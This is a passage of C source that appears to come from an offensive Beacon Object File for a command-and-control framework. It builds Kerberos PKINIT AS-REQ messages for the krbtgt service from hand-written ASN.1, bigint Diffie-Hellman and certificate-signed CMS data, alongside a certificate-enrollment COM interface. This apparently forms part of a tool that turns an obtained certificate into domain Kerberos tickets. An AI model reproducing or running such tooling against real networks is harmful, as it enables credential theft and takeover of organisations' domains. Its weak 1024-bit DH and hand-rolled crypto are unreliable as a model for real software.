    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);

    return result;
}

/* Build APPLICATION tag */
static BYTE* BuildApplication(int appNum, BYTE* content, int contentLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];

    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);

    result[0] = 0x60 | appNum; /* APPLICATION constructed */
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);

    return result;
}

/* Build GeneralString */
static BYTE* BuildGeneralString(const char* str, int* outLen) {
    int strLen = (int)strlen(str);
    int lenSize;
    BYTE lenBuf[4];
    BYTE* result;

    lenSize = EncodeLength(lenBuf, strLen);
    *outLen = 1 + lenSize + strLen;
    result = (BYTE*)malloc(*outLen);

    result[0] = 0x1B; /* GeneralString */
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, str, strLen);

    return result;
}

/* Build GeneralizedTime */
static BYTE* BuildGeneralizedTime(const char* timeStr, int* outLen) {
    int strLen = (int)strlen(timeStr);
    BYTE* result;

    *outLen = 2 + strLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x18; /* GeneralizedTime */
    result[1] = (BYTE)strLen;
    memcpy(result + 2, timeStr, strLen);

    return result;
}

/* Combine multiple byte arrays */
static BYTE* CombineBytes(BYTE** arrays, int* lengths, int count, int* outLen) {
    int totalLen = 0;
    for (int i = 0; i < count; i++) {
        totalLen += lengths[i];
    }

    BYTE* result = (BYTE*)malloc(totalLen);
    int offset = 0;
    for (int i = 0; i < count; i++) {
        memcpy(result + offset, arrays[i], lengths[i]);
        offset += lengths[i];
    }

    *outLen = totalLen;
    return result;
}

/*
 * =============================================================================
 * ICertRequest COM Interface (only for STANDALONE mode)
 * =============================================================================
 */

#ifndef BOF
typedef struct ICertRequest ICertRequest;
typedef struct ICertRequestVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICertRequest*, REFIID, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(ICertRequest*);
    ULONG (STDMETHODCALLTYPE *Release)(ICertRequest*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(ICertRequest*, UINT*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(ICertRequest*, UINT, LCID, void**);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(ICertRequest*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(ICertRequest*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
    HRESULT (STDMETHODCALLTYPE *Submit)(ICertRequest*, LONG, BSTR, BSTR, BSTR, LONG*);
    HRESULT (STDMETHODCALLTYPE *RetrievePending)(ICertRequest*, LONG, BSTR, LONG*);
    HRESULT (STDMETHODCALLTYPE *GetLastStatus)(ICertRequest*, LONG*);
    HRESULT (STDMETHODCALLTYPE *GetRequestId)(ICertRequest*, LONG*);
    HRESULT (STDMETHODCALLTYPE *GetDispositionMessage)(ICertRequest*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *GetCACertificate)(ICertRequest*, LONG, BSTR, LONG, BSTR*);
    HRESULT (STDMETHODCALLTYPE *GetCertificate)(ICertRequest*, LONG, BSTR*);
} ICertRequestVtbl;

struct ICertRequest {
    ICertRequestVtbl* lpVtbl;
};
#endif /* !BOF */

/*
 * =============================================================================
 * PKINIT - Build KDC-REQ-BODY
 * =============================================================================
 */

/* Build PrincipalName structure */
static BYTE* BuildPrincipalName(int nameType, const char* name1, const char* name2, int* outLen) {
    int offset = 0;
    BYTE* content = (BYTE*)malloc(1024);
    BYTE* nameStrings = (BYTE*)malloc(512);
    int nameStringsLen = 0;

    /* name-type [0] INTEGER */
    int nameTypeLen;
    BYTE* nameTypeInt = BuildInteger(nameType, &nameTypeLen);
    int nameTypeTagLen;
    BYTE* nameTypeTag = BuildContextTag(0, nameTypeInt, nameTypeLen, &nameTypeTagLen);
    memcpy(content + offset, nameTypeTag, nameTypeTagLen);
    offset += nameTypeTagLen;
    free(nameTypeInt);
    free(nameTypeTag);

    /* name-string [1] SEQUENCE OF GeneralString */
    int str1Len;
    BYTE* str1 = BuildGeneralString(name1, &str1Len);
    memcpy(nameStrings + nameStringsLen, str1, str1Len);
    nameStringsLen += str1Len;
    free(str1);

    if (name2 != NULL) {
        int str2Len;
        BYTE* str2 = BuildGeneralString(name2, &str2Len);
        memcpy(nameStrings + nameStringsLen, str2, str2Len);
        nameStringsLen += str2Len;
        free(str2);
    }

    int nameStrSeqLen;
    BYTE* nameStrSeq = BuildSequence(nameStrings, nameStringsLen, &nameStrSeqLen);
    int nameStrTagLen;
    BYTE* nameStrTag = BuildContextTag(1, nameStrSeq, nameStrSeqLen, &nameStrTagLen);
    memcpy(content + offset, nameStrTag, nameStrTagLen);
    offset += nameStrTagLen;
    free(nameStrSeq);
    free(nameStrTag);
    free(nameStrings);

    BYTE* result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/* Build KDC-REQ-BODY for AS-REQ */
static BYTE* BuildKdcReqBody(const char* user, const char* realm, int* outLen) {
    BYTE* content = (BYTE*)malloc(4096);
    int offset = 0;

    /* kdc-options [0] BIT STRING */
    /* Flags: forwardable (0x40), renewable (0x80), canonicalize (0x10), renewable-ok (0x10) */
    BYTE kdcOptions[] = { 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10 };
    int kdcOptsTagLen;
    BYTE* kdcOptsTag = BuildContextTag(0, kdcOptions, sizeof(kdcOptions), &kdcOptsTagLen);
    memcpy(content + offset, kdcOptsTag, kdcOptsTagLen);
    offset += kdcOptsTagLen;
    free(kdcOptsTag);

    /* cname [1] PrincipalName (NT-PRINCIPAL = 1) */
    int cnameLen;
    BYTE* cname = BuildPrincipalName(1, user, NULL, &cnameLen);
    int cnameTagLen;
    BYTE* cnameTag = BuildContextTag(1, cname, cnameLen, &cnameTagLen);
    memcpy(content + offset, cnameTag, cnameTagLen);
    offset += cnameTagLen;
    free(cname);
    free(cnameTag);

    /* realm [2] GeneralString */
    int realmStrLen;
    BYTE* realmStr = BuildGeneralString(realm, &realmStrLen);
    int realmTagLen;
    BYTE* realmTag = BuildContextTag(2, realmStr, realmStrLen, &realmTagLen);
    memcpy(content + offset, realmTag, realmTagLen);
    offset += realmTagLen;
    free(realmStr);
    free(realmTag);

    /* sname [3] PrincipalName (NT-SRV-INST = 2, krbtgt/REALM) */
    int snameLen;
    BYTE* sname = BuildPrincipalName(2, "krbtgt", realm, &snameLen);
    int snameTagLen;
    BYTE* snameTag = BuildContextTag(3, sname, snameLen, &snameTagLen);
    memcpy(content + offset, snameTag, snameTagLen);
    offset += snameTagLen;
    free(sname);
    free(snameTag);

    /* till [5] KerberosTime (1 year from now) */
    SYSTEMTIME st;
    GetSystemTime(&st);
    char tillTime[20];
    sprintf(tillTime, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear + 1, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    int tillStrLen;
    BYTE* tillStr = BuildGeneralizedTime(tillTime, &tillStrLen);
    int tillTagLen;
    BYTE* tillTag = BuildContextTag(5, tillStr, tillStrLen, &tillTagLen);
    memcpy(content + offset, tillTag, tillTagLen);
    offset += tillTagLen;
    free(tillStr);
    free(tillTag);

    /* nonce [7] INTEGER */
    srand((unsigned int)time(NULL));
    g_nonce = 100000000 + (rand() % 899999999);
    int nonceLen;
    BYTE* nonceInt = BuildInteger(g_nonce, &nonceLen);
    int nonceTagLen;
    BYTE* nonceTag = BuildContextTag(7, nonceInt, nonceLen, &nonceTagLen);
    memcpy(content + offset, nonceTag, nonceTagLen);
    offset += nonceTagLen;
    free(nonceInt);
    free(nonceTag);

    /* etype [8] SEQUENCE OF INTEGER */
    BYTE etypesContent[32];
    int etypesContentLen = 0;
    int etypeLen;

    BYTE* etype1 = BuildInteger(ETYPE_AES256_CTS_HMAC_SHA1, &etypeLen);
    memcpy(etypesContent + etypesContentLen, etype1, etypeLen);
    etypesContentLen += etypeLen;
    free(etype1);

    BYTE* etype2 = BuildInteger(ETYPE_AES128_CTS_HMAC_SHA1, &etypeLen);
    memcpy(etypesContent + etypesContentLen, etype2, etypeLen);
    etypesContentLen += etypeLen;
    free(etype2);

    BYTE* etype3 = BuildInteger(ETYPE_RC4_HMAC, &etypeLen);
    memcpy(etypesContent + etypesContentLen, etype3, etypeLen);
    etypesContentLen += etypeLen;
    free(etype3);

    int etypesSeqLen;
    BYTE* etypesSeq = BuildSequence(etypesContent, etypesContentLen, &etypesSeqLen);
    int etypesTagLen;
    BYTE* etypesTag = BuildContextTag(8, etypesSeq, etypesSeqLen, &etypesTagLen);
    memcpy(content + offset, etypesTag, etypesTagLen);
    offset += etypesTagLen;
    free(etypesSeq);
    free(etypesTag);

    BYTE* result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * BigInteger Implementation for DH (1024-bit MODP Group 2)
 * =============================================================================
 */

#define BIGINT_WORDS 64  /* 64 x 32-bit = 2048 bits max (for intermediate results) */
#define DH_BYTES 128     /* 1024 bits */
#define DH_WORDS 32      /* 32 x 32-bit words */

typedef struct {
    DWORD words[BIGINT_WORDS];  /* Little-endian word array */
    int len;                     /* Number of significant words */
} BigInt;

/* Initialize BigInt to zero */
static void bigint_zero(BigInt* n) {
    memset(n->words, 0, sizeof(n->words));
    n->len = 1;
}

/* Initialize BigInt from big-endian byte array */
static void bigint_from_bytes(BigInt* n, const BYTE* data, int dataLen) {
    int i, j;
    bigint_zero(n);

    /* Convert big-endian bytes to little-endian words */
    for (i = 0; i < dataLen && i < DH_BYTES; i++) {
        int bytePos = dataLen - 1 - i;
        int wordIdx = i / 4;
        int byteIdx = i % 4;
        n->words[wordIdx] |= ((DWORD)data[bytePos]) << (byteIdx * 8);
    }

    /* Calculate actual length */
    n->len = (dataLen + 3) / 4;
    while (n->len > 1 && n->words[n->len - 1] == 0) n->len--;
}

/* Convert BigInt to big-endian byte array */
static void bigint_to_bytes(BigInt* n, BYTE* out, int outLen) {
    int i;
    memset(out, 0, outLen);

    for (i = 0; i < outLen && i < n->len * 4; i++) {
        int wordIdx = i / 4;
        int byteIdx = i % 4;
        out[outLen - 1 - i] = (BYTE)(n->words[wordIdx] >> (byteIdx * 8));
    }
}

/* Compare: returns -1 if a < b, 0 if a == b, 1 if a > b */
static int bigint_cmp(BigInt* a, BigInt* b) {
    int i;
    int maxLen = (a->len > b->len) ? a->len : b->len;

    for (i = maxLen - 1; i >= 0; i--) {
        DWORD aw = (i < a->len) ? a->words[i] : 0;
        DWORD bw = (i < b->len) ? b->words[i] : 0;
        if (aw > bw) return 1;
        if (aw < bw) return -1;
    }
    return 0;
}

/* Subtraction: result = a - b (assumes a >= b) */
static void bigint_sub(BigInt* result, BigInt* a, BigInt* b) {
    int i;
    LONGLONG borrow = 0;

    for (i = 0; i < a->len; i++) {
        LONGLONG diff = (LONGLONG)a->words[i] - borrow;
        if (i < b->len) diff -= b->words[i];
        if (diff < 0) {
            diff += 0x100000000LL;
            borrow = 1;
        } else {
            borrow = 0;
        }
        result->words[i] = (DWORD)diff;
    }
    result->len = a->len;
    while (result->len > 1 && result->words[result->len - 1] == 0) result->len--;
}

/* Multiplication: result = a * b */
static void bigint_mul(BigInt* result, BigInt* a, BigInt* b) {
    int i, j;
    BigInt temp;
    bigint_zero(&temp);

    for (i = 0; i < a->len; i++) {
        ULONGLONG carry = 0;
        for (j = 0; j < b->len || carry; j++) {
            ULONGLONG prod = temp.words[i + j] + carry;
            if (j < b->len) prod += (ULONGLONG)a->words[i] * b->words[j];
            temp.words[i + j] = (DWORD)prod;
            carry = prod >> 32;
        }
        if (i + j > temp.len) temp.len = i + j;
    }
    while (temp.len > 1 && temp.words[temp.len - 1] == 0) temp.len--;

    memcpy(result, &temp, sizeof(BigInt));
}

/* Get bit at position */
static int bigint_get_bit(BigInt* n, int pos) {
    int wordIdx = pos / 32;
    int bitIdx = pos % 32;
    if (wordIdx >= n->len) return 0;
    return (n->words[wordIdx] >> bitIdx) & 1;
}

/* Get number of significant bits */
static int bigint_bit_length(BigInt* n) {
    int i;
    if (n->len == 0) return 0;

    DWORD top = n->words[n->len - 1];
    int bits = (n->len - 1) * 32;

    while (top) {
        bits++;
        top >>= 1;
    }
    return bits;
}

/* Modulo: result = a mod p (using repeated subtraction for simplicity) */
static void bigint_mod(BigInt* result, BigInt* a, BigInt* p) {
    BigInt temp, shifted_p;
    int shift;

    memcpy(&temp, a, sizeof(BigInt));

    /* Simple division by repeated subtraction with shifting */
    while (bigint_cmp(&temp, p) >= 0) {
        /* Find how much to shift p */
        int tempBits = bigint_bit_length(&temp);
        int pBits = bigint_bit_length(p);
        shift = tempBits - pBits;

        /* Shift p left */
        memcpy(&shifted_p, p, sizeof(BigInt));
        if (shift > 0) {
            int wordShift = shift / 32;
            int bitShift = shift % 32;
            int i;

            /* Shift by words */
            if (wordShift > 0) {
                for (i = shifted_p.len - 1; i >= 0; i--) {
                    if (i + wordShift < BIGINT_WORDS) {
                        shifted_p.words[i + wordShift] = shifted_p.words[i];
                    }
                    shifted_p.words[i] = 0;
                }
                shifted_p.len += wordShift;
            }

            /* Shift by bits */
            if (bitShift > 0) {
                DWORD carry = 0;
                for (i = 0; i < shifted_p.len; i++) {
                    DWORD newCarry = shifted_p.words[i] >> (32 - bitShift);
                    shifted_p.words[i] = (shifted_p.words[i] << bitShift) | carry;
                    carry = newCarry;
                }
                if (carry) {
                    shifted_p.words[shifted_p.len++] = carry;
                }
            }
        }

        /* If shifted_p > temp, reduce shift by 1 */
        if (bigint_cmp(&shifted_p, &temp) > 0) {
            /* Shift right by 1 bit */
            int i;
            for (i = 0; i < shifted_p.len; i++) {
                shifted_p.words[i] >>= 1;
                if (i + 1 < shifted_p.len) {
                    shifted_p.words[i] |= (shifted_p.words[i + 1] & 1) << 31;
                }
            }
            while (shifted_p.len > 1 && shifted_p.words[shifted_p.len - 1] == 0) {
                shifted_p.len--;
            }
        }

        /* Subtract */
        if (bigint_cmp(&temp, &shifted_p) >= 0) {
            bigint_sub(&temp, &temp, &shifted_p);
        } else {
            break;
        }
    }

    memcpy(result, &temp, sizeof(BigInt));
}

/* Modular exponentiation: result = base^exp mod p (square-and-multiply) */
static void bigint_modpow(BigInt* result, BigInt* base, BigInt* exp, BigInt* p) {
    BigInt temp_result, temp_base, temp_mul;
    int i, expBits;

    /* result = 1 */
    bigint_zero(&temp_result);
    temp_result.words[0] = 1;
    temp_result.len = 1;

    /* temp_base = base mod p */
    bigint_mod(&temp_base, base, p);

    expBits = bigint_bit_length(exp);

    for (i = 0; i < expBits; i++) {
        if (bigint_get_bit(exp, i)) {
            /* result = (result * temp_base) mod p */
            bigint_mul(&temp_mul, &temp_result, &temp_base);
            bigint_mod(&temp_result, &temp_mul, p);
        }
        /* temp_base = (temp_base * temp_base) mod p */
        bigint_mul(&temp_mul, &temp_base, &temp_base);
        bigint_mod(&temp_base, &temp_mul, p);
    }

    memcpy(result, &temp_result, sizeof(BigInt));
}

/*
 * =============================================================================
 * PKINIT - DH Key Generation (using BigInteger)
 * =============================================================================
 */

static void GenerateDHKeys(HCRYPTPROV hProv) {
    BigInt p, g, x, y;

    /* Generate random private key x (128 bytes) */
    CryptGenRandom(hProv, sizeof(g_dhPrivateKey), g_dhPrivateKey);
    g_dhPrivateKey[0] &= 0x7F; /* Ensure positive */

    /* Initialize BigInts */
    bigint_from_bytes(&p, DH_P_MODP2, sizeof(DH_P_MODP2));
    bigint_from_bytes(&g, DH_G_MODP2, sizeof(DH_G_MODP2));
    bigint_from_bytes(&x, g_dhPrivateKey, sizeof(g_dhPrivateKey));

    /* Calculate public key: y = g^x mod p */
    bigint_modpow(&y, &g, &x, &p);

    /* Convert back to bytes */
    bigint_to_bytes(&y, g_dhPublicKey, sizeof(g_dhPublicKey));
}

/* Build DH SubjectPublicKeyInfo */
static BYTE* BuildDhSubjectPublicKeyInfo(int* outLen) {
    BYTE* content = (BYTE*)malloc(1024);
    BYTE* domainParamsContent = (BYTE*)malloc(256);
    BYTE* algIdContent = (BYTE*)malloc(512);
    int offset = 0;

    /* AlgorithmIdentifier for DH */
    /* OID: 1.2.840.10046.2.1 (dhpublicnumber) */
    BYTE dhOid[] = { 0x06, 0x07, 0x2A, 0x86, 0x48, 0xCE, 0x3E, 0x02, 0x01 };

    /* DomainParameters: SEQUENCE { p INTEGER, g INTEGER } */
    int pIntLen;
    BYTE* pInt = BuildIntegerFromBytes((BYTE*)DH_P_MODP2, sizeof(DH_P_MODP2), &pIntLen);
    int gIntLen;
    BYTE* gInt = BuildIntegerFromBytes((BYTE*)DH_G_MODP2, sizeof(DH_G_MODP2), &gIntLen);

    memcpy(domainParamsContent, pInt, pIntLen);
    memcpy(domainParamsContent + pIntLen, gInt, gIntLen);
    int domainParamsLen;
    BYTE* domainParams = BuildSequence(domainParamsContent, pIntLen + gIntLen, &domainParamsLen);
    free(pInt);
    free(gInt);

    /* Build AlgorithmIdentifier SEQUENCE */
    memcpy(algIdContent, dhOid, sizeof(dhOid));
    memcpy(algIdContent + sizeof(dhOid), domainParams, domainParamsLen);
    int algIdLen;
    BYTE* algId = BuildSequence(algIdContent, sizeof(dhOid) + domainParamsLen, &algIdLen);
    free(domainParams);

    memcpy(content + offset, algId, algIdLen);
    offset += algIdLen;
    free(algId);

    /* BIT STRING containing public key INTEGER */
    int pubKeyIntLen;
    BYTE* pubKeyInt = BuildIntegerFromBytes(g_dhPublicKey, sizeof(g_dhPublicKey), &pubKeyIntLen);
    int pubKeyBitLen;
    BYTE* pubKeyBit = BuildBitString(pubKeyInt, pubKeyIntLen, &pubKeyBitLen);
    free(pubKeyInt);

    memcpy(content + offset, pubKeyBit, pubKeyBitLen);
    offset += pubKeyBitLen;
    free(pubKeyBit);

    free(domainParamsContent);
    free(algIdContent);
    BYTE* result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * PKINIT - AuthPack Construction
 * =============================================================================
 */

static BYTE* BuildPKAuthenticator(const char* user, const char* realm,
                                   BYTE* paChecksum, int paChecksumLen, int* outLen) {
    BYTE* content = (BYTE*)malloc(512);
    int offset = 0;

    /* cusec [0] INTEGER (microseconds) */
    SYSTEMTIME st;
    GetSystemTime(&st);
    int cusec = st.wMilliseconds * 1000;
    int cusecLen;
    BYTE* cusecInt = BuildInteger(cusec, &cusecLen);
    int cusecTagLen;
    BYTE* cusecTag = BuildContextTag(0, cusecInt, cusecLen, &cusecTagLen);
    memcpy(content + offset, cusecTag, cusecTagLen);
    offset += cusecTagLen;
    free(cusecInt);
    free(cusecTag);

    /* ctime [1] KerberosTime */
    char ctime[20];
    sprintf(ctime, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    int ctimeStrLen;
    BYTE* ctimeStr = BuildGeneralizedTime(ctime, &ctimeStrLen);
    int ctimeTagLen;
    BYTE* ctimeTag = BuildContextTag(1, ctimeStr, ctimeStrLen, &ctimeTagLen);
    memcpy(content + offset, ctimeTag, ctimeTagLen);
    offset += ctimeTagLen;
    free(ctimeStr);
    free(ctimeTag);

    /* nonce [2] INTEGER */
    int nonceLen;
    BYTE* nonceInt = BuildInteger(g_nonce, &nonceLen);
    int nonceTagLen;
    BYTE* nonceTag = BuildContextTag(2, nonceInt, nonceLen, &nonceTagLen);
    memcpy(content + offset, nonceTag, nonceTagLen);
    offset += nonceTagLen;
    free(nonceInt);
    free(nonceTag);

    /* paChecksum [3] OCTET STRING (SHA-1 of req-body) */
    if (paChecksum != NULL && paChecksumLen > 0) {
        int checksumOctetLen;
        BYTE* checksumOctet = BuildOctetString(paChecksum, paChecksumLen, &checksumOctetLen);
        int checksumTagLen;
        BYTE* checksumTag = BuildContextTag(3, checksumOctet, checksumOctetLen, &checksumTagLen);
        memcpy(content + offset, checksumTag, checksumTagLen);
        offset += checksumTagLen;
        free(checksumOctet);
        free(checksumTag);
    }

    BYTE* result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

static BYTE* BuildAuthPack(const char* user, const char* realm,
                           BYTE* paChecksum, int paChecksumLen, int* outLen) {
    BYTE* content = (BYTE*)malloc(2048);
    int offset = 0;

    /* pkAuthenticator [0] PKAuthenticator */
    int pkAuthLen;
    BYTE* pkAuth = BuildPKAuthenticator(user, realm, paChecksum, paChecksumLen, &pkAuthLen);
    int pkAuthTagLen;
    BYTE* pkAuthTag = BuildContextTag(0, pkAuth, pkAuthLen, &pkAuthTagLen);
    memcpy(content + offset, pkAuthTag, pkAuthTagLen);
    offset += pkAuthTagLen;
    free(pkAuth);
    free(pkAuthTag);

    /* clientPublicValue [1] SubjectPublicKeyInfo (for DH) */
    int dhPubKeyInfoLen;
    BYTE* dhPubKeyInfo = BuildDhSubjectPublicKeyInfo(&dhPubKeyInfoLen);
    int dhPubKeyTagLen;
    BYTE* dhPubKeyTag = BuildContextTag(1, dhPubKeyInfo, dhPubKeyInfoLen, &dhPubKeyTagLen);
    memcpy(content + offset, dhPubKeyTag, dhPubKeyTagLen);
    offset += dhPubKeyTagLen;
    free(dhPubKeyInfo);
    free(dhPubKeyTag);

    BYTE* result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * PKINIT - CMS SignedData Construction
 * =============================================================================
 */

static BYTE* BuildCmsSignedData(PCCERT_CONTEXT pCert, BYTE* content, int contentLen, int* outLen) {
    /*
     * Build CMS SignedData using Windows CryptoMsg API
     * Uses CryptMsgOpenToEncode with id-pkinit-authData OID
     */
    #define szOID_PKINIT_AUTHDATA_STR "1.3.6.1.5.2.3.1"

    HCRYPTPROV hProv = 0;
    DWORD keySpec = 0;
    BOOL fCallerFree = FALSE;
    HCRYPTMSG hMsg = NULL;
    BYTE* signedMsg = NULL;
    DWORD signedMsgLen = 0;
    CMSG_SIGNER_ENCODE_INFO signerInfo;
    CMSG_SIGNED_ENCODE_INFO signedInfo;
    CERT_BLOB certBlob;

    *outLen = 0;

    if (!CryptAcquireCertificatePrivateKey(pCert, CRYPT_ACQUIRE_USE_PROV_INFO_FLAG,
                                           NULL, &hProv, &keySpec, &fCallerFree)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to acquire private key: 0x%08X", GetLastError());
        return NULL;
    }

    memset(&signerInfo, 0, sizeof(signerInfo));
    signerInfo.cbSize = sizeof(signerInfo);
    signerInfo.pCertInfo = pCert->pCertInfo;
    signerInfo.hCryptProv = hProv;
    signerInfo.dwKeySpec = keySpec;
    signerInfo.HashAlgorithm.pszObjId = (LPSTR)szOID_RSA_SHA1RSA;

    certBlob.cbData = pCert->cbCertEncoded;
    certBlob.pbData = pCert->pbCertEncoded;

    memset(&signedInfo, 0, sizeof(signedInfo));
    signedInfo.cbSize = sizeof(signedInfo);
    signedInfo.cSigners = 1;
    signedInfo.rgSigners = &signerInfo;
    signedInfo.cCertEncoded = 1;
    signedInfo.rgCertEncoded = &certBlob;

    hMsg = CryptMsgOpenToEncode(
        PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
        0,
        CMSG_SIGNED,
        &signedInfo,
        szOID_PKINIT_AUTHDATA_STR,
        NULL
    );

    if (!hMsg) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgOpenToEncode failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    if (!CryptMsgUpdate(hMsg, content, contentLen, TRUE)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgUpdate failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    if (!CryptMsgGetParam(hMsg, CMSG_CONTENT_PARAM, 0, NULL, &signedMsgLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgGetParam size failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    signedMsg = (BYTE*)malloc(signedMsgLen);
    if (!CryptMsgGetParam(hMsg, CMSG_CONTENT_PARAM, 0, signedMsg, &signedMsgLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgGetParam failed: 0x%08X", GetLastError());
        free(signedMsg);
        signedMsg = NULL;
        goto cleanup;
    }

    *outLen = signedMsgLen;

cleanup:
    if (hMsg) CryptMsgClose(hMsg);
    if (fCallerFree && hProv) CryptReleaseContext(hProv, 0);
    return signedMsg;
}

/*
 * =============================================================================
 * PKINIT - PA-PK-AS-REQ Construction
 * =============================================================================
 */

static BYTE* BuildPaPkAsReq(PCCERT_CONTEXT pCert, BYTE* authPack, int authPackLen, int* outLen) {
    /* Build CMS SignedData containing AuthPack */
    int signedDataLen;
    BYTE* signedData = BuildCmsSignedData(pCert, authPack, authPackLen, &signedDataLen);

    if (signedData == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build CMS SignedData");
        return NULL;
    }

    /* PA-PK-AS-REQ ::= SEQUENCE {
     *   signedAuthPack [0] IMPLICIT OCTET STRING
     * }
     */
    BYTE* content = (BYTE*)malloc(8192);
    int offset = 0;

    /* [0] IMPLICIT - use context tag 0x80 for primitive or 0xA0 for constructed */
    content[offset++] = 0x80; /* [0] IMPLICIT primitive */
    int lenSize = EncodeLength(content + offset, signedDataLen);
    offset += lenSize;
    memcpy(content + offset, signedData, signedDataLen);
    offset += signedDataLen;
    free(signedData);

    BYTE* result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * PKINIT - Full AS-REQ Construction
 * =============================================================================
 */

static BYTE* BuildPkinitAsReq(PCCERT_CONTEXT pCert, const char* user, const char* domain, int* outLen) {
    char* realm = (char*)malloc(256);
    BYTE* padataContent = (BYTE*)malloc(8192);
    BYTE* asReqContent = (BYTE*)malloc(16384);
    BYTE* result = NULL;
    int i;

    /* Convert domain to uppercase for realm */
    for (i = 0; domain[i] && i < 255; i++) {
        realm[i] = (domain[i] >= 'a' && domain[i] <= 'z') ? domain[i] - 32 : domain[i];
    }
    realm[i] = '\0';

    /* Build req-body first (needed for paChecksum) */
    int reqBodyLen;
    BYTE* reqBody = BuildKdcReqBody(user, realm, &reqBodyLen);

    /* Calculate SHA-1 of req-body for paChecksum */
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    BYTE paChecksum[20];
    DWORD hashLen = 20;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContext failed");
        free(reqBody);
        goto cleanup;
    }

    /* Generate DH keys */
    GenerateDHKeys(hProv);

    CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash);
    CryptHashData(hHash, reqBody, reqBodyLen, 0);
    CryptGetHashParam(hHash, HP_HASHVAL, paChecksum, &hashLen, 0);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    /* Build AuthPack */
    int authPackLen;
    BYTE* authPack = BuildAuthPack(user, realm, paChecksum, 20, &authPackLen);

    /* Build PA-PK-AS-REQ */
    int paPkAsReqLen;
    BYTE* paPkAsReq = BuildPaPkAsReq(pCert, authPack, authPackLen, &paPkAsReqLen);
    free(authPack);

    if (paPkAsReq == NULL) {
        free(reqBody);
        goto cleanup;
    }

    /* Build PA-DATA for PKINIT */
    int padataOffset = 0;

    /* padata-type [1] INTEGER (16 = PA-PK-AS-REQ) */
    int paTypeLen;
    BYTE* paTypeInt = BuildInteger(PA_PK_AS_REQ, &paTypeLen);
    int paTypeTagLen;
    BYTE* paTypeTag = BuildContextTag(1, paTypeInt, paTypeLen, &paTypeTagLen);
    memcpy(padataContent + padataOffset, paTypeTag, paTypeTagLen);
    padataOffset += paTypeTagLen;
    free(paTypeInt);
    free(paTypeTag);

    /* padata-value [2] OCTET STRING */
    int paValueOctetLen;
    BYTE* paValueOctet = BuildOctetString(paPkAsReq, paPkAsReqLen, &paValueOctetLen);
    int paValueTagLen;
    BYTE* paValueTag = BuildContextTag(2, paValueOctet, paValueOctetLen, &paValueTagLen);
    memcpy(padataContent + padataOffset, paValueTag, paValueTagLen);
    padataOffset += paValueTagLen;
    free(paValueOctet);
    free(paValueTag);
    free(paPkAsReq);

    int padataSeqLen;
    BYTE* padataSeq = BuildSequence(padataContent, padataOffset, &padataSeqLen);

    /* Build AS-REQ */
    int asReqOffset = 0;

    /* pvno [1] INTEGER (5) */
    int pvnoLen;
    BYTE* pvnoInt = BuildInteger(5, &pvnoLen);
    int pvnoTagLen;
    BYTE* pvnoTag = BuildContextTag(1, pvnoInt, pvnoLen, &pvnoTagLen);
    memcpy(asReqContent + asReqOffset, pvnoTag, pvnoTagLen);
    asReqOffset += pvnoTagLen;
    free(pvnoInt);
    free(pvnoTag);

    /* msg-type [2] INTEGER (10 = AS-REQ) */
    int msgTypeLen;
    BYTE* msgTypeInt = BuildInteger(KRB_AS_REQ, &msgTypeLen);
    int msgTypeTagLen;
    BYTE* msgTypeTag = BuildContextTag(2, msgTypeInt, msgTypeLen, &msgTypeTagLen);
    memcpy(asReqContent + asReqOffset, msgTypeTag, msgTypeTagLen);
    asReqOffset += msgTypeTagLen;
    free(msgTypeInt);
    free(msgTypeTag);

    /* padata [3] SEQUENCE OF PA-DATA */
    int padataOuterSeqLen;
    BYTE* padataOuterSeq = BuildSequence(padataSeq, padataSeqLen, &padataOuterSeqLen);
    int padataOuterTagLen;
    BYTE* padataOuterTag = BuildContextTag(3, padataOuterSeq, padataOuterSeqLen, &padataOuterTagLen);
    memcpy(asReqContent + asReqOffset, padataOuterTag, padataOuterTagLen);
